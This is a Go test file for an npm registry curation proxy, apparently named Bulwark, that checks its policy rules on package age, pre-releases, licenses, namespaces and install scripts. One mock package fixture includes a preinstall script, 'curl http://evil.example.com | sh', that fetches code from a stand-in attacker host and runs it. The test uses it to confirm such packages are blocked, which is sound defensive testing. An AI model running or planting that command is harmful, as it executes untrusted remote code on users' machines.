// SPDX-License-Identifier: Apache-2.0

package main

import (
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"Bulwark/common/config"
	"Bulwark/common/rules"
)

// testErrorLogger returns a discard-level error logger for test helpers.
func testErrorLogger() *slog.Logger {
	l, _, _ := createLogger("text", "error", "")
	return l
}

const (
	testPkgLodash  = "lodash"
	testPkgScoped  = "@babel/core"
	testVersionOne = "4.17.21"
	testVersionPre = "4.18.0-beta.1"

	testPathLodash        = "/lodash"
	testPathScopedPkg     = "/@babel/core"
	testPathLodashTarball = "/lodash/-/lodash-4.17.21.tgz"
	testPathScopedTarball = "/@babel/core/-/core-7.0.0.tgz"
	testPathLodashTarPfx  = "/-/lodash-"
	testPathReadyz        = "/readyz"

	mimeOctetStream = "application/octet-stream"
	hdrPolicyNotice = "X-Curation-Policy-Notice"

	testUpstreamURL     = "https://registry.npmjs.org"
	testUpstreamInvalid = "://invalid"
	testTokenValue      = "my-npm-token"

	testRuleBlockPre = "block-pre"
	testRuleAge7d    = "age-7d"

	testTimeOld2021    = "2021-01-01T00:00:00Z"
	testTimeOld2020    = "2020-01-01T00:00:00Z"
	testTimeRecent2024 = "2024-01-01T00:00:00Z"

	testFakeTarball      = "fake-tarball-content"
	testFakeTarballShort = "fake-tarball"

	testErrGetPackument = "GET packument: %v"
	testErrFilterPkg    = "filterNpmPackument: %v"
	testErrTempDir      = "TempDir: %v"
	testErrWriteString  = "WriteString: %v"
	testErrInitServer   = "initServer: %v"
	testFmtWant200      = "want 200, got %d"
)

func buildTestServer(t *testing.T, upstreamURL string, policy config.PolicyConfig) *testServerResult {
	t.Helper()
	cfg := &config.Config{
		Server:   config.ServerConfig{Port: 0},
		Upstream: config.UpstreamConfig{URL: upstreamURL, TimeoutSeconds: 5},
		Cache:    config.CacheConfig{TTLSeconds: 60},
		Logging:  config.LoggingConfig{Level: "error", Format: "text"},
		Policy:   policy,
	}
	cfg.Defaults()
	logger, logLevel, _ := createLogger(cfg.Logging.Format, cfg.Logging.Level, "")
	srv, err := buildServer(cfg, logger, logLevel)
	if err != nil {
		t.Fatalf("buildServer: %v", err)
	}
	ts := httptest.NewServer(srv.mux)
	t.Cleanup(ts.Close)
	return &testServerResult{srv: srv, url: ts.URL}
}

type testServerResult struct {
	srv *Server
	url string
}

func mockPackument(name string, versions map[string]string) []byte {
	type version struct {
		Name    string `json:"name"`
		Version string `json:"version"`
	}
	type packument struct {
		Name     string                     `json:"name"`
		Versions map[string]json.RawMessage `json:"versions"`
		DistTags map[string]string          `json:"dist-tags"`
		Time     map[string]string          `json:"time"`
	}
	p := packument{
		Name:     name,
		Versions: make(map[string]json.RawMessage),
		DistTags: map[string]string{},
		Time:     map[string]string{},
	}
	for ver, publishedAt := range versions {
		vdata, _ := json.Marshal(version{Name: name, Version: ver})
		p.Versions[ver] = vdata
		p.Time[ver] = publishedAt
	}
	if len(versions) > 0 {
		for v := range versions {
			p.DistTags["latest"] = v
			break
		}
	}
	b, _ := json.Marshal(p)
	return b
}

func TestNpmHealthEndpoint(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer mock.Close()

	ts := buildTestServer(t, mock.URL, config.PolicyConfig{})
	resp, err := http.Get(ts.url + "/healthz")
	if err != nil {
		t.Fatalf("GET /healthz: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("healthz: want 200, got %d", resp.StatusCode)
	}
}

func TestNpmReadyzOK(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer mock.Close()

	ts := buildTestServer(t, mock.URL, config.PolicyConfig{})
	resp, err := http.Get(ts.url + testPathReadyz)
	if err != nil {
		t.Fatalf("GET /readyz: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("readyz: want 200, got %d", resp.StatusCode)
	}
}

func TestNpmReadyzUpstreamDown(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer mock.Close()

	ts := buildTestServer(t, mock.URL, config.PolicyConfig{})
	resp, err := http.Get(ts.url + testPathReadyz)
	if err != nil {
		t.Fatalf("GET /readyz: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusServiceUnavailable {
		t.Errorf("readyz down: want 503, got %d", resp.StatusCode)
	}
}

func TestPackumentAllowed(t *testing.T) {
	oldTime := time.Now().AddDate(0, 0, -30).Format(time.RFC3339)
	body := mockPackument(testPkgLodash, map[string]string{testVersionOne: oldTime})

	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set(hdrContentType, mimeJSON)
		w.Write(body) //nolint:errcheck
	}))
	defer mock.Close()

	ts := buildTestServer(t, mock.URL, config.PolicyConfig{})
	resp, err := http.Get(ts.url + "/" + testPkgLodash)
	if err != nil {
		t.Fatalf(testErrGetPackument, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("packument: want 200, got %d", resp.StatusCode)
	}
}

func TestPackumentPreReleaseFiltered(t *testing.T) {
	oldTime := time.Now().AddDate(0, 0, -30).Format(time.RFC3339)
	body := mockPackument(testPkgLodash, map[string]string{
		testVersionOne: oldTime,
		testVersionPre: oldTime,
	})

	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set(hdrContentType, mimeJSON)
		w.Write(body) //nolint:errcheck
	}))
	defer mock.Close()

	policy := config.PolicyConfig{Rules: []config.PackageRule{
		{Name: testRuleBlockPre, BlockPreRelease: true},
	}}
	ts := buildTestServer(t, mock.URL, policy)

	resp, err := http.Get(ts.url + "/" + testPkgLodash)
	if err != nil {
		t.Fatalf(testErrGetPackument, err)
	}
	defer resp.Body.Close()

	if resp.Header.Get(hdrPolicyNotice) == "" {
		t.Error("expected X-Curation-Policy-Notice header")
	}
}

func TestPackumentCacheHit(t *testing.T) {
	calls := 0
	oldTime := time.Now().AddDate(0, 0, -30).Format(time.RFC3339)
	body := mockPackument(testPkgLodash, map[string]string{testVersionOne: oldTime})

	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		calls++
		w.Header().Set(hdrContentType, mimeJSON)
		w.Write(body) //nolint:errcheck
	}))
	defer mock.Close()

	ts := buildTestServer(t, mock.URL, config.PolicyConfig{})
	for i := 0; i < 2; i++ {
		resp, err := http.Get(ts.url + "/" + testPkgLodash)
		if err != nil {
			t.Fatalf("request %d: %v", i, err)
		}
		resp.Body.Close()
	}
	if calls > 1 {
		t.Errorf("upstream called %d times; want 1 (cache should prevent second call)", calls)
	}
}

func TestScopedPackument(t *testing.T) {
	oldTime := time.Now().AddDate(0, 0, -30).Format(time.RFC3339)
	body := mockPackument(testPkgScoped, map[string]string{"7.0.0": oldTime})

	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set(hdrContentType, mimeJSON)
		w.Write(body) //nolint:errcheck
	}))
	defer mock.Close()

	ts := buildTestServer(t, mock.URL, config.PolicyConfig{})
	resp, err := http.Get(ts.url + testPathScopedPkg)
	if err != nil {
		t.Fatalf("GET scoped packument: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("scoped packument: want 200, got %d", resp.StatusCode)
	}
}

func TestTarballProxied(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set(hdrContentType, mimeOctetStream)
		fmt.Fprint(w, testFakeTarball)
	}))
	defer mock.Close()

	ts := buildTestServer(t, mock.URL, config.PolicyConfig{})
	resp, err := http.Get(ts.url + testPathLodashTarball)
	if err != nil {
		t.Fatalf("GET tarball: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("tarball: want 200, got %d", resp.StatusCode)
	}
}

func TestTarballBlockedByPolicy(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer mock.Close()

	policy := config.PolicyConfig{Rules: []config.PackageRule{
		{Name: testRuleBlockPre, BlockPreRelease: true},
	}}
	ts := buildTestServer(t, mock.URL, policy)
	resp, err := http.Get(ts.url + "/lodash/-/lodash-5.0.0-beta.1.tgz")
	if err != nil {
		t.Fatalf("GET tarball blocked: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("pre-release tarball: want 403, got %d", resp.StatusCode)
	}
}

func TestTarballBlockedByAgeUsingPackumentTimestamp(t *testing.T) {
	recent := time.Now().UTC().Add(-24 * time.Hour).Format(time.RFC3339)
	packument := mockPackument("ms", map[string]string{"2.1.3": recent})
	tarballCalls := 0

	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/ms":
			w.Header().Set(hdrContentType, mimeJSON)
			w.Write(packument) //nolint:errcheck
		case "/ms/-/ms-2.1.3.tgz":
			tarballCalls++
			w.Header().Set(hdrContentType, mimeOctetStream)
			fmt.Fprint(w, testFakeTarball)
		default:
			http.NotFound(w, r)
		}
	}))
	defer mock.Close()

	policy := config.PolicyConfig{Rules: []config.PackageRule{
		{Name: "min-age-ms", PackagePatterns: []string{"ms"}, MinPackageAgeDays: 7},
	}}
	ts := buildTestServer(t, mock.URL, policy)

	resp, err := http.Get(ts.url + "/ms/-/ms-2.1.3.tgz")
	if err != nil {
		t.Fatalf("GET tarball blocked by age: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("age-blocked tarball: want 403, got %d", resp.StatusCode)
	}
	if tarballCalls != 0 {
		t.Errorf("tarball upstream should not be fetched when age check denies; got %d calls", tarballCalls)
	}
}

func TestTarballBlockedByInstallScriptsUsingPackumentMeta(t *testing.T) {
	packument := []byte(`{
		"name":"evilpkg",
		"versions":{
			"1.0.0":{
				"name":"evilpkg",
				"version":"1.0.0",
				"scripts":{"postinstall":"node install.js"}
			}
		},
		"dist-tags":{"latest":"1.0.0"},
		"time":{"1.0.0":"2020-01-01T00:00:00Z"}
	}`)
	tarballCalls := 0

	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/evilpkg":
			w.Header().Set(hdrContentType, mimeJSON)
			w.Write(packument) //nolint:errcheck
		case "/evilpkg/-/evilpkg-1.0.0.tgz":
			tarballCalls++
			w.Header().Set(hdrContentType, mimeOctetStream)
			fmt.Fprint(w, testFakeTarball)
		default:
			http.NotFound(w, r)
		}
	}))
	defer mock.Close()

	policy := config.PolicyConfig{
		InstallScripts: config.InstallScriptsConfig{Enabled: true, Action: "deny"},
	}
	ts := buildTestServer(t, mock.URL, policy)

	resp, err := http.Get(ts.url + "/evilpkg/-/evilpkg-1.0.0.tgz")
	if err != nil {
		t.Fatalf("GET tarball blocked by install scripts: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("install-scripts-blocked tarball: want 403, got %d", resp.StatusCode)
	}
	if tarballCalls != 0 {
		t.Errorf("tarball upstream should not be fetched when install scripts denies; got %d calls", tarballCalls)
	}
}

func TestExtractPackageName(t *testing.T) {
	cases := []struct{ path, want string }{
		{testPathLodash, "lodash"},
		{testPathScopedPkg, testPkgScoped},
		{testPathLodashTarball, "lodash"},
		{testPathScopedTarball, testPkgScoped},
	}
	for _, tc := range cases {
		got := extractPackageName(tc.path)
		if got != tc.want {
			t.Errorf("extractPackageName(%q): want %q, got %q", tc.path, tc.want, got)
		}
	}
}

func TestExtractVersionFromTarball(t *testing.T) {
	cases := []struct {
		path string
		pkg  string
		want string
	}{
		{path: testPathLodashTarball, pkg: "lodash", want: testVersionOne},
		{path: testPathScopedTarball, pkg: testPkgScoped, want: "7.0.0"},
		{path: "/undici-types/-/undici-types-7.22.0.tgz", pkg: "undici-types", want: "7.22.0"},
		{path: testPathLodash, pkg: "lodash", want: ""},
	}
	for _, tc := range cases {
		got := extractVersionFromTarball(tc.path, tc.pkg)
		if got != tc.want {
			t.Errorf("extractVersionFromTarball(%q): want %q, got %q", tc.path, tc.want, got)
		}
	}
}

func TestPackumentUpstreamError(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer mock.Close()

	ts := buildTestServer(t, mock.URL, config.PolicyConfig{})
	resp, err := http.Get(ts.url + "/" + testPkgLodash)
	if err != nil {
		t.Fatalf(testErrGetPackument, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusBadGateway {
		t.Errorf("upstream 500: want 502, got %d", resp.StatusCode)
	}
}

func TestNpmMetrics(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer mock.Close()

	cfg := &config.Config{
		Server:   config.ServerConfig{Port: 0},
		Upstream: config.UpstreamConfig{URL: mock.URL, TimeoutSeconds: 5},
		Cache:    config.CacheConfig{TTLSeconds: 60},
		Metrics:  config.MetricsConfig{Enabled: true},
		Logging:  config.LoggingConfig{Level: "error", Format: "text"},
	}
	cfg.Defaults()
	logger, logLevel, _ := createLogger(cfg.Logging.Format, cfg.Logging.Level, "")
	srv, _ := buildServer(cfg, logger, logLevel)
	ts := httptest.NewServer(srv.mux)
	defer ts.Close()

	resp, err := http.Get(ts.URL + "/metrics")
	if err != nil {
		t.Fatalf("GET /metrics: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("metrics: want 200, got %d", resp.StatusCode)
	}
}

func TestIsTarballPath(t *testing.T) {
	cases := []struct {
		path string
		want bool
	}{
		{testPathLodashTarball, true},
		{testPathScopedTarball, true},
		{testPathLodash, false},
		{testPathScopedPkg, false},
	}
	for _, tc := range cases {
		got := isTarballPath(tc.path)
		if got != tc.want {
			t.Errorf("isTarballPath(%q): want %v, got %v", tc.path, tc.want, got)
		}
	}
}

func TestFilterNpmPackumentInvalidJSON(t *testing.T) {
	_, _, _, err := filterNpmPackument([]byte("not json"), "lodash", nil, "", nil)
	if err == nil {
		t.Error("expected error for invalid JSON")
	}
}

func TestPackument404FromUpstream(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	}))
	defer mock.Close()

	ts := buildTestServer(t, mock.URL, config.PolicyConfig{})
	resp, err := http.Get(ts.url + "/nonexistentpkg")
	if err != nil {
		t.Fatalf("GET packument 404: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Errorf("packument 404: want 404, got %d", resp.StatusCode)
	}
}

func TestPackumentNamespaceBlocked(t *testing.T) {
	oldTime := time.Now().AddDate(0, 0, -30).Format(time.RFC3339)
	body := mockPackument("myco-evil", map[string]string{"1.0.0": oldTime})

	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set(hdrContentType, mimeJSON)
		w.Write(body) //nolint:errcheck
	}))
	defer mock.Close()

	policy := config.PolicyConfig{Rules: []config.PackageRule{
		{Name: "ns", NamespaceProtection: config.NamespaceCfg{
			Enabled:          true,
			InternalPatterns: []string{"myco-*"},
		}},
	}}
	ts := buildTestServer(t, mock.URL, policy)
	resp, err := http.Get(ts.url + "/myco-evil")
	if err != nil {
		t.Fatalf("GET namespace blocked: %v", err)
	}
	defer resp.Body.Close()
	// Namespace violation returns 403 with a policy reason.
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("namespace blocked: want 403, got %d", resp.StatusCode)
	}
}

func TestFilterNpmPackumentInstallScriptsRule(t *testing.T) {
	packument := []byte(`{
		"name":"evilpkg",
		"versions":{
			"1.0.0":{
				"name":"evilpkg",
				"version":"1.0.0",
				"scripts":{"postinstall":"node install.js"}
			}
		},
		"dist-tags":{"latest":"1.0.0"},
		"time":{"1.0.0":"2020-01-01T00:00:00Z"}
	}`)

	policy := config.PolicyConfig{
		InstallScripts: config.InstallScriptsConfig{Enabled: true, Action: "deny"},
	}
	engine := rules.New(policy)

	_, removed, _, err := filterNpmPackument(packument, "evilpkg", engine, testUpstreamURL, testErrorLogger())
	if err != nil {
		t.Fatalf(testErrFilterPkg, err)
	}
	if removed != 1 {
		t.Errorf("install script rule: want removed=1, got %d", removed)
	}
}

func TestFilterNpmPackumentLicenseRule(t *testing.T) {
	packument := []byte(`{
		"name":"gplpkg",
		"versions":{
			"1.0.0":{
				"name":"gplpkg",
				"version":"1.0.0",
				"license":"GPL-3.0"
			}
		},
		"dist-tags":{"latest":"1.0.0"},
		"time":{"1.0.0":"2020-01-01T00:00:00Z"}
	}`)

	policy := config.PolicyConfig{
		Rules: []config.PackageRule{{Name: "oss-only", DeniedLicenses: []string{"GPL-3.0"}}},
	}
	engine := rules.New(policy)

	_, removed, _, err := filterNpmPackument(packument, "gplpkg", engine, testUpstreamURL, testErrorLogger())
	if err != nil {
		t.Fatalf(testErrFilterPkg, err)
	}
	if removed != 1 {
		t.Errorf("license rule: want removed=1, got %d", removed)
	}
}

// TestNpmPackumentAgeBlockFiltersRecentVersions verifies that recent versions
// (published after cutoff) are removed from the packument by the age rule, and
// the "latest" dist-tag pointing to a blocked version is also removed.
func TestNpmPackumentAgeBlockFiltersRecentVersions(t *testing.T) {
	recentTime := time.Now().AddDate(0, 0, -1).Format(time.RFC3339) // 1 day old
	body := mockPackument(testPkgLodash, map[string]string{
		testVersionOne: recentTime,
		"4.17.20":      recentTime,
	})

	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set(hdrContentType, mimeJSON)
		w.Write(body) //nolint:errcheck
	}))
	defer mock.Close()

	policy := config.PolicyConfig{
		Rules: []config.PackageRule{
			{Name: testRuleAge7d, MinPackageAgeDays: 7},
		},
	}
	ts := buildTestServer(t, mock.URL, policy)

	resp, err := http.Get(ts.url + "/" + testPkgLodash)
	if err != nil {
		t.Fatalf(testErrGetPackument, err)
	}
	defer resp.Body.Close()
	// Both versions are only 1 day old; with a 7-day age rule, both should be removed.
	// The proxy should return 403 since all versions are blocked.
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("age block all versions: want 403, got %d", resp.StatusCode)
	}
}

// TestNpmPackumentAgeBlockKeepsOldVersionsRemovesNew verifies that old versions
// pass the age filter while recent ones are removed. If "latest" pointed to the
// recent version, that dist-tag is removed.
func TestNpmPackumentAgeBlockKeepsOldVersionsRemovesNew(t *testing.T) {
	oldTime := time.Now().AddDate(0, 0, -30).Format(time.RFC3339) // 30 days old
	newTime := time.Now().AddDate(0, 0, -1).Format(time.RFC3339)  // 1 day old

	// Manually build packument so we can control dist-tags precisely.
	packumentJSON := fmt.Sprintf(`{
		"name": "%s",
		"versions": {
			"4.17.20": {"name": "%s", "version": "4.17.20"},
			"4.17.21": {"name": "%s", "version": "4.17.21"}
		},
		"dist-tags": {"latest": "4.17.21"},
		"time": {"4.17.20": "%s", "4.17.21": "%s"}
	}`, testPkgLodash, testPkgLodash, testPkgLodash, oldTime, newTime)

	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set(hdrContentType, mimeJSON)
		fmt.Fprint(w, packumentJSON)
	}))
	defer mock.Close()

	policy := config.PolicyConfig{
		Rules: []config.PackageRule{
			{Name: testRuleAge7d, MinPackageAgeDays: 7},
		},
	}
	ts := buildTestServer(t, mock.URL, policy)

	resp, err := http.Get(ts.url + "/" + testPkgLodash)
	if err != nil {
		t.Fatalf(testErrGetPackument, err)
	}
	defer resp.Body.Close()

	var doc struct {
		Versions map[string]json.RawMessage `json:"versions"`
		DistTags map[string]string          `json:"dist-tags"`
		Time     map[string]string          `json:"time"`
	}
	json.NewDecoder(resp.Body).Decode(&doc) //nolint:errcheck

	// 4.17.20 (30 days old) should survive; 4.17.21 (1 day old) should be removed.
	if _, ok := doc.Versions["4.17.20"]; !ok {
		t.Error("age block: old version 4.17.20 should remain")
	}
	if _, ok := doc.Versions[testVersionOne]; ok {
		t.Error("age block: recent version 4.17.21 should be removed")
	}

	// "latest" pointed to 4.17.21 which was removed => dist-tag should be gone.
	if tag, ok := doc.DistTags["latest"]; ok && tag == testVersionOne {
		t.Error("age block: latest dist-tag should not still point to filtered version")
	}

	// Time map entry for the removed version should also be gone.
	if _, ok := doc.Time[testVersionOne]; ok {
		t.Error("age block: time entry for filtered version should be removed")
	}
}

// TestNpmTarballAgeBlockDeniesDirectDownload verifies that direct tarball
// downloads are blocked by age rules when the tarball path timestamp is
// unavailable (fail-closed to prevent age-check bypass).
func TestNpmTarballAgeBlockDeniesDirectDownload(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Packument request returns no time info.
		if !strings.Contains(r.URL.Path, "/-/") {
			w.Header().Set(hdrContentType, mimeJSON)
			fmt.Fprint(w, `{"name":"lodash","versions":{"4.17.21":{"name":"lodash","version":"4.17.21"}},"dist-tags":{"latest":"4.17.21"},"time":{}}`)
			return
		}
		w.Header().Set(hdrContentType, mimeOctetStream)
		fmt.Fprint(w, testFakeTarballShort)
	}))
	defer mock.Close()

	policy := config.PolicyConfig{
		Rules: []config.PackageRule{
			{Name: testRuleAge7d, MinPackageAgeDays: 7},
		},
	}
	ts := buildTestServer(t, mock.URL, policy)

	// Direct tarball download — version extracted but PublishedAt is zero.
	resp, err := http.Get(ts.url + testPathLodashTarball)
	if err != nil {
		t.Fatalf("GET tarball: %v", err)
	}
	defer resp.Body.Close()

	// Should be denied: age filtering required but no timestamp available (fail-closed).
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("tarball with age rule + no timestamp: want 403, got %d", resp.StatusCode)
	}
}

// TestFilterNpmPackumentTrustedBypassesInstallScripts verifies that a trusted
// package with install scripts is not filtered out of the packument.
func TestFilterNpmPackumentTrustedBypassesInstallScripts(t *testing.T) {
	packument := []byte(`{
		"name":"esbuild",
		"versions":{
			"0.19.12":{
				"name":"esbuild",
				"version":"0.19.12",
				"scripts":{"postinstall":"node install.js"}
			}
		},
		"dist-tags":{"latest":"0.19.12"},
		"time":{"0.19.12":"2024-01-01T00:00:00Z"}
	}`)

	policy := config.PolicyConfig{
		TrustedPackages: []string{"esbuild"},
		InstallScripts: config.InstallScriptsConfig{
			Enabled: true,
			Action:  "deny",
		},
	}
	engine := rules.New(policy)

	_, removed, _, err := filterNpmPackument(packument, "esbuild", engine, testUpstreamURL, testErrorLogger())
	if err != nil {
		t.Fatalf(testErrFilterPkg, err)
	}
	if removed != 0 {
		t.Errorf("trusted package: want removed=0, got %d", removed)
	}
}

// TestFilterNpmPackumentTrustedScopeBypassesAllRules verifies that a trusted
// scoped pattern (e.g. @types/*) bypasses all rules including age and pre-release.
func TestFilterNpmPackumentTrustedScopeBypassesAllRules(t *testing.T) {
	recentTime := time.Now().AddDate(0, 0, -1).Format(time.RFC3339)
	packument := []byte(fmt.Sprintf(`{
		"name":"@types/node",
		"versions":{
			"20.0.0-beta.1":{
				"name":"@types/node",
				"version":"20.0.0-beta.1"
			}
		},
		"dist-tags":{"latest":"20.0.0-beta.1"},
		"time":{"20.0.0-beta.1":%q}
	}`, recentTime))

	policy := config.PolicyConfig{
		TrustedPackages: []string{"@types/*"},
		Rules: []config.PackageRule{
			{Name: "block-all", BlockPreRelease: true, MinPackageAgeDays: 10000},
		},
	}
	engine := rules.New(policy)

	_, removed, _, err := filterNpmPackument(packument, "@types/node", engine, testUpstreamURL, testErrorLogger())
	if err != nil {
		t.Fatalf(testErrFilterPkg, err)
	}
	if removed != 0 {
		t.Errorf("trusted scoped package: want removed=0, got %d", removed)
	}
}

// TestFilterNpmPackumentUntrustedWithScriptsBlocked verifies that an untrusted
// package with install scripts is properly blocked when install_scripts is enabled.
func TestFilterNpmPackumentUntrustedWithScriptsBlocked(t *testing.T) {
	packument := []byte(`{
		"name":"sketchy",
		"versions":{
			"1.0.0":{
				"name":"sketchy",
				"version":"1.0.0",
				"scripts":{"preinstall":"curl http://evil.example.com | sh"}
			}
		},
		"dist-tags":{"latest":"1.0.0"},
		"time":{"1.0.0":"2024-01-01T00:00:00Z"}
	}`)

	policy := config.PolicyConfig{
		TrustedPackages: []string{"@types/*", "lodash"},
		InstallScripts: config.InstallScriptsConfig{
			Enabled: true,
			Action:  "deny",
			Reason:  "install scripts not allowed",
		},
	}
	engine := rules.New(policy)

	_, removed, _, err := filterNpmPackument(packument, "sketchy", engine, testUpstreamURL, testErrorLogger())
	if err != nil {
		t.Fatalf(testErrFilterPkg, err)
	}
	if removed != 1 {
		t.Errorf("untrusted package with scripts: want removed=1, got %d", removed)
	}
}

// TestFilterNpmPackumentAllowedWithScriptsAllowlist verifies that
// allowed_with_scripts exempts a specific package from install script blocking
// even when it is not in the trusted_packages list.
func TestFilterNpmPackumentAllowedWithScriptsAllowlist(t *testing.T) {
	packument := []byte(`{
		"name":"esbuild",
		"versions":{
			"0.19.12":{
				"name":"esbuild",
				"version":"0.19.12",
				"scripts":{"postinstall":"node install.js"}
			}
		},
		"dist-tags":{"latest":"0.19.12"},
		"time":{"0.19.12":"2024-01-01T00:00:00Z"}
	}`)

	policy := config.PolicyConfig{
		InstallScripts: config.InstallScriptsConfig{
			Enabled:            true,
			Action:             "deny",
			AllowedWithScripts: []string{"esbuild"},
		},
	}
	engine := rules.New(policy)

	_, removed, _, err := filterNpmPackument(packument, "esbuild", engine, testUpstreamURL, testErrorLogger())
	if err != nil {
		t.Fatalf(testErrFilterPkg, err)
	}
	if removed != 0 {
		t.Errorf("allowed_with_scripts package: want removed=0, got %d", removed)
	}
}
